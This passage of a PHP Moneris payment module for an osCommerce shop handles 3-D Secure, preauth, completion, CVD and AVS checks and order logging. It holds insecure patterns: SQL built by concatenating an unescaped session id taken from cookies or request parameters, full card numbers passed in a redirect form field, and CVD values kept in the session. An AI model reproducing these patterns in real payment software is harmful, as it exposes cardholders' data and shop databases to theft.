        $this->amount = $this->subtotal + $this->shipping + $this->product_tax;
      }

      $this->amount = number_format($this->amount, 2, '.', '');

    }

    function renderAcceptLevel() {
      $result = '';

      $accessLevel = constant("MODULE_PAYMENT_MONERISCAMPG_" . $this->card_type . "_LEVEL");

      switch ($accessLevel) {
        case 'Do not accept':
          $result = 'NOT ACCEPT';
          break;
        case 'Normal Transaction only':
          $result = 'NONE';
          break;
        case 'Perform AVS':
        case 'Perform CVD':
        case 'Perform AVS/CVD':
          $result = 'EFRAUD';
          break;
        case 'Perform VbV':
        case 'Perform MCSC':
          $result = 'MPI';
          break;
        case 'Perform VbV and AVS/CVD':
        case 'Perform MCSC and AVS/CVD':
    	  $result = 'ALL';
    	  break;
      }
      return $result;
    }

    function generateCustInfo() {
      global $order;
      $custInfo = new mpgCustInfo();

      foreach ($order->products as $item) {
        $itemInfo= array(
                         name=>htmlentities($item['name'], ENT_QUOTES),
                         quantity=>$item['qty'],
                         product_code=>$item['id'],
                         extended_amount=>number_format($item['final_price'], 2, '.', '')
                        );
        $custInfo->setItems($itemInfo);
      }
      reset ($order->products);

      $billing = array(
                       first_name => $order->billing['firstname'],
                       last_name => $order->billing['lastname'],
                       company_name => $order->billing['company'],
                       address => $order->billing['street_address'],
                       city => $order->billing['city'],
                       province => $order->billing['state'],
                       postal_code => $order->billing['postcode'],
                       country => $order->billing['country']['title'],
                       phone_number => $order->customer['telephone'],
		       fax => '',
		       tax1 => $this->product_tax,
		       tax2 => $this->shipping_tax,
		       tax3 => '',
                       shipping_cost => $this->shipping
                 );
      $custInfo->setBilling($billing);

      $shipping = array(
                        first_name => $order->delivery['firstname'],
                        last_name => $order->delivery['lastname'],
                        company_name => $order->delivery['company'],
                        address => $order->delivery['street_address'],
                        city => $order->delivery['city'],
                        province => $order->delivery['state'],
                        postal_code => $order->delivery['postcode'],
                        country => $order->delivery['country']['title'],
                        phone_number => $order->customer['telephone'],
		        fax => '',
		        tax1 => $this->product_tax,
		        tax2 => $this->shipping_tax,
		        tax3 => '',
                        shipping_cost => $this->shipping
                  );
      $custInfo->setShipping($shipping);

      $custInfo->setInstructions($order->info['comment']);



      return $custInfo;
    }

    function insert_moneris_order ($response) {
      global $HTTP_GET_VARS, $HTTP_POST_VARS;

      $order_id  = $this->moneris_order_id;
      $osCsid = $this->sid;
      $f4l4 = substr($this->cc_card_number, 0, 4) . "***" . substr($this->cc_card_number, -4);
      $ref_num = $response->getReferenceNum();
      $resp_code = $response->getResponseCode();
      $auth_code = $response->getAuthCode();
      $iso_code = $response->getISO();
      $trans_date = $response->getTransDate();
      $trans_time = $response->getTransTime();
      $trans_type = $response->getTransType();
      $message = $response->getMessage();
      $message = str_replace ("'", "''", $message);
      $card_type = $response->getCardType();
      $txn_num = $response->getTxnNumber();
      $avs_code = $response->getAvsResultCode();
      $cvd_code = $response->getCvdResultCode();
      $veres = str_replace ("'", "''", $this->veres);
      $pares = str_replace ("'", "''", $this->pares);

      tep_db_query(
                   "insert into moneris_can_orders (" .
                   "moneris_order_id, gateway_url, osc_order_id, osc_session, ref_num, f4l4, " .
                   "iso_code, resp_code, auth_code, trans_date, " .
                   "trans_time, trans_type, message, " .
                   "card_type, txn_num, avs_code, cvd_code, " .
                   "crypt_type, veres, pares " .
                   ") values (" .
                   "'" . $order_id . "', '" . $this->host . "', '', '" . $osCsid . "', '" . $ref_num . "', '" . $f4l4 . "', ".
                   "'" . $iso_code . "', '" . $resp_code . "', '" . $auth_code . "', '" . $trans_date . "', " .
                   "'" . $trans_time . "', '" . $trans_type . "', '" . $message . "', " .
                   "'" . $card_type . "', '" . $txn_num . "', '" . $avs_code . "', '" . $cvd_code ."', " .
                   "'" . $this->crypt_type . "', '" . $veres . "', '" . $pares . "'" .
                   ")"
                  );
    }

    function performTxnRequest() {

      global $HTTP_GET_VARS;
      require (DIR_WS_CLASSES . 'CANmpiClassesOsc.php');

      $host=(MODULE_PAYMENT_MONERISCAMPG_ENV == "Production Server" ? "www3.moneris.com" : "esqa.moneris.com");

      $HTTP_ACCEPT = getenv("HTTP_ACCEPT");
      $HTTP_USER_AGENT = getenv("HTTP_USER_AGENT");
      $xid = "TXN" . str_pad(time(), 17, "0", STR_PAD_LEFT);
      $redirectURL = tep_href_link(FILENAME_CHECKOUT_PROCESS, '', 'SSL');

      $txnArray=array(
                      type=>'txn',
                      xid=>$xid,
                      amount=>$this->amount,
                      pan=>$this->cc_card_number,
                      expdate=>$this->expiry_date,
                      MD=>"osCsid=" . $this->sid .
                          "&amp;pan=" . $this->cc_card_number .
                          "&amp;expdate=" . $this->expiry_date .
                          "&amp;amount=" . $this->amount .
                          "&amp;card_type=" . $this->card_type,
                      merchantUrl=>$redirectURL,
                      accept =>$HTTP_ACCEPT,
                      userAgent =>$HTTP_USER_AGENT
                     );

      $mpiTxn = new MpiTransaction($txnArray);

      $mpiRequest = new MpiRequest($mpiTxn);

      $mpiHttpPost = new MpiHttpsPost($this->host, $this->store_id,$this->api_token,$mpiRequest);
      $mpiResponse = $mpiHttpPost->getMpiResponse();
      $this->veres = $mpiResponse->getMpiMessage();

      if( $this->veres == 'Y') {
        $inlineForm = $mpiResponse->getMpiInLineForm();
        global $HTTP_POST_VARS, $_SESSION;

        if ($this->cvd) {
          $campg_cvd = $HTTP_POST_VARS['campg_cvd'];
          $_SESSION['campg_cvd'] = $campg_cvd;
        }

        if ($this->avs) {
          $campg_avs_st_num = $HTTP_POST_VARS['campg_avs_st_num'];
          $campg_avs_st_name = $HTTP_POST_VARS['campg_avs_st_name'];
          $campg_avs_zip = $HTTP_POST_VARS['campg_avs_zip'];
          $_SESSION['campg_avs_st_num'] = $campg_avs_st_num;
          $_SESSION['campg_avs_st_name'] = $campg_avs_st_name;
          $_SESSION['campg_avs_zip'] = $campg_avs_zip;
        }
        print "$inlineForm\n\n";
        exit(); // Exit code and Connect to the Verified by Visa Gateway
      } else {
        if ($this->veres == 'U') {
          $this->crypt_type='7';
        } else {
          $this->crypt_type='6';
        }
        $this->performMpgTransaction();
      }

      return false;

    }

    function performMpgTransaction() {


      global $HTTP_POST_VARS, $order;
      require (DIR_WS_CLASSES . 'CANmpgClassesOsc.php');
      $txnArray=array(
	              type=>'preauth',
	  	      order_id=>$this->moneris_order_id,
	  	      cust_id=> substr($order->billing['firstname'] . ' ' .  $order->billing['lastname'], 0, 50),
	  	      amount=>$this->amount,
	  	      pan=>$this->cc_card_number,
	  	      expdate=>$this->expiry_date,
	  	      crypt_type=>$this->crypt_type
	  	     );

      $mpgTxn = new mpgTransaction($txnArray);

      $custInfo = $this->generateCustInfo();

      $mpgTxn->setCustInfo($custInfo);

      if ($this->cvd == true) {

        $cvdTemplate = array(
        	             'cvd_indicator' => '1',
        	             'cvd_value' => $HTTP_POST_VARS['campg_cvd']
        	            );

        $mpgCvdInfo = new mpgCvdInfo ($cvdTemplate);
        $mpgTxn->setCvdInfo($mpgCvdInfo);

      }

      if ($this->avs == true) {

        $avsTemplate = array(
                             'avs_street_number' => $HTTP_POST_VARS['campg_avs_st_num'],
                             'avs_street_name' => $HTTP_POST_VARS['campg_avs_st_name'],
                             'avs_zipcode' => $HTTP_POST_VARS['campg_avs_zip']
                            );
        $mpgAvsInfo = new mpgAvsInfo ($avsTemplate);
        $mpgTxn -> setAvsInfo ($mpgAvsInfo);
      }

      $mpgRequest = new mpgRequest($mpgTxn);

      $mpgHttpPost = new mpgHttpsPost($this->host, $this->store_id,$this->api_token,$mpgRequest);

      $response = $mpgHttpPost->getMpgResponse();

      $this->insert_moneris_order ($response);

      $result = false;

      $result = $this->handleMpgResponse($response);

      if ($result) {


        if ($this->complete_now) {
          $txnNumber = $response->getTxnNumber();

          $CompArray = array(
                             type=>'completion',
                             order_id=>$this->moneris_order_id,
                             comp_amount=>$this->amount,
                             txn_number=>$txnNumber,
                             crypt_type=>$this->crypt_type
                            );

          $compTxn = new mpgTransaction($CompArray);

          $compRequest = new mpgRequest($compTxn);

          $compHttpPost  =new mpgHttpsPost($this->host, $this->store_id, $this->api_token,$compRequest);

          $compResponse=$compHttpPost->getMpgResponse();

          $this->insert_moneris_order ($compResponse);

        }

        return false;

      } else {
        tep_redirect(tep_href_link(FILENAME_CHECKOUT_PAYMENT, 'error_message=' . $this->processError, 'SSL', true, false));
      }
      return false;
    }

    function performACSTransaction() {
      global $HTTP_POST_VARS, $order;
      require (DIR_WS_CLASSES . 'CANmpiClassesOsc.php');
      $txnArray=array(
                      type=>'acs',
                      PaRes=>$HTTP_POST_VARS['PaRes'],
                      MD=>$HTTP_POST_VARS['MD']
                     );

      $mpiTxn = new MpiTransaction($txnArray);
      $mpiRequest = new MpiRequest($mpiTxn);

      $mpiHttpPost  = new MpiHttpsPost($this->host, $this->store_id,$this->api_token,$mpiRequest);

      $mpiResponse=$mpiHttpPost->getMpiResponse();

      parse_str($HTTP_POST_VARS['MD'], $merchData);

      $this->sid = $merchData['osCsid'];
      $this->expiry_date = $merchData['expdate'];
      $this->cc_card_number = $merchData['pan'];
      $this->crypt_type = '5';
      $this->veres = 'Y';
      $this->pares = $mpiResponse->getMpiSuccess();

      if( strcmp($this->pares,"true") == 0 ) {

    	require (DIR_WS_CLASSES . 'CANmpgClassesOsc.php');

    	$cavv = $mpiResponse->getMpiCavv();

    	$txnArray=array(
    	                type=>'cavv_preauth',
    	                order_id=> $this->moneris_order_id,
    	                cust_id=> substr($order->billing['firstname'] . ' ' .  $order->billing['lastname'], 0, 50),
    	                amount=>$this->amount,
    	                pan=>$this->cc_card_number,
    	                expdate=>$this->expiry_date,
    	                cavv=>$cavv
    	               );

    	$mpgTxn = new mpgTransaction($txnArray);

        $custInfo = $this->generateCustInfo();

        $mpgTxn->setCustInfo($custInfo);

      	if ($this->cvd == true) {

	  $cvdTemplate = array(
	        	       'cvd_indicator' => '1',
	        	       'cvd_value' => $this->cvd_num
	        	      );

	  $mpgCvdInfo = new mpgCvdInfo ($cvdTemplate);
	  $mpgTxn->setCvdInfo($mpgCvdInfo);

	}

	if ($this->avs == true) {

	  $avsTemplate = array(
	                       'avs_street_number' => $this->avs_st_num,
	                       'avs_street_name' => $this->avs_st_name,
	                       'avs_zipcode' => $this->avs_zip
	                      );
	  $mpgAvsInfo = new mpgAvsInfo ($avsTemplate);
	  $mpgTxn -> setAvsInfo ($mpgAvsInfo);

	}
    	$mpgRequest = new mpgRequest($mpgTxn);

    	$mpgHttpPost  = new mpgHttpsPost($this->host, $this->store_id,$this->api_token,$mpgRequest);

    	$mpgResponse = $mpgHttpPost->getMpgResponse();

    	$this->pares = $mpiResponse->getMpiSuccess();

    	$this->insert_moneris_order ($mpgResponse);

    	$result = false;

	$result = $this->handleMpgResponse($mpgResponse);

	if ($result) {

    	  if ($this->complete_now) {
            $txnNumber = $mpgResponse->getTxnNumber();

            $resp = $mpiResponse->getMpiMessage();

            if ($resp == 'Y') {
              $cavv_crypt_type = '5';
            } elseif ($resp == 'A') {
              $cavv_crypt_type = '6';
            } else {
              $cavv_crypt_type = '7';
            }

            $CompArray = array(
                               type=>'completion',
                               order_id=>$this->moneris_order_id,
                               comp_amount=>$this->amount,
                               txn_number=>$txnNumber,
                               crypt_type=>$cavv_crypt_type
                              );

            $compTxn = new mpgTransaction($CompArray);

            $compRequest = new mpgRequest($compTxn);

            $compHttpPost  =new mpgHttpsPost($this->host, $this->store_id, $this->api_token,$compRequest);

            $compResponse=$compHttpPost->getMpgResponse();

            $this->insert_moneris_order ($compResponse);

          }

    	}  else {
          tep_redirect(tep_href_link(FILENAME_CHECKOUT_PAYMENT, 'error_message=' . $this->processError, 'SSL', true, false));
        }
    	return false;
      } else {
    	  tep_redirect(tep_href_link(FILENAME_CHECKOUT_PAYMENT, 'error_message=' . MODULE_PAYMENT_MONERISCAMPG_TEXT_VBV_FAILED_ERROR, 'SSL', true, false));
      }
    }

    function handleMpgResponse($response) {

      $this->processError = '';

      $success = true;

      //Basic Processing
      if ($response->getReceiptId() == 'Global Error Receipt') {
        $this->processError = $this->processError . urlencode(MODULE_PAYMENT_MONERISCAMPG_TEXT_GLOBAL_ERROR);
        return false;
      }

      if (($response->getReceiptId() == 'null') && ($response->getResponseCode() == 'null')) {
        $this->processError = $this->processError . urlencode(MODULE_PAYMENT_MONERISCAMPG_TEXT_UNKNOWN_ERROR);
        return false;
      }

      if ($response->getResponseCode() >= 50) {
        $this->processError = $this->processError . urlencode(MODULE_PAYMENT_MONERISCAMPG_TEXT_DECLINED_MESSAGE);
        $success = false;
      }

      // CVD
      if ($this->cvd == true) {
        if (strcmp($this->card_type ,'AMEX') != 0)
        {
          $cvd_result = $response->getCvdResultCode();
          $cvd_result = strtolower(substr($cvd_result, 1, 1));
          $chkStr = '';

          switch (MODULE_PAYMENT_MONERISCAMPG_CVD) {
            case 'Full Matches Only':
              $chkStr = 'M';
              break;
            case 'Allow Unparticipated Cards':
              $chkStr = 'MPU';
              break;
            default:
              $chkStr = '';
              break;
          }
          $chkStr = strtolower($chkStr);
          $cvd_pass = strpos($chkStr, $cvd_result);
        }
        else {
          $cvd_pass = true;  // AMEX, assume cvd value to be a pass.
        }

        if ($cvd_pass === false) {
          $this->processError = $this->processError . urlencode(MODULE_PAYMENT_MONERISCAMPG_TEXT_CVD_ERROR);
          $success = false;
        }

      }

      // AVS
      if ($this->avs == true) {
        $avs_result = strtolower($response->getAvsResultCode());
        $avs_chkStr = trim(strtolower(MODULE_PAYMENT_MONERISCAMPG_AVS_STR));
        $avs_pass = (strpos($avs_chkStr, $avs_result) === false) ? false : true;

        if ($avs_pass === false) {
          $this->processError = $this->processError . urlencode(MODULE_PAYMENT_MONERISCAMPG_TEXT_AVS_ERROR);
          $success = false;
        }
      }
      return $success;
    }

    function get_SID() {
      global $_COOKIE, $HTTP_POST_VARS, $HTTP_GET_VARS;
      if (isset($_COOKIE['osCsid']) && strlen ($_COOKIE['osCsid']) > 0) return $_COOKIE['osCsid'];
      if (isset($HTTP_POST_VARS['osCsid']) && strlen ($HTTP_POST_VARS['osCsid']) > 0) return $HTTP_POST_VARS['osCsid'];
      if (isset($HTTP_GET_VARS['osCsid']) && strlen ($HTTP_GET_VARS['osCsid']) > 0) return $HTTP_GET_VARS['osCsid'];

      return '';
    }
  }
?>
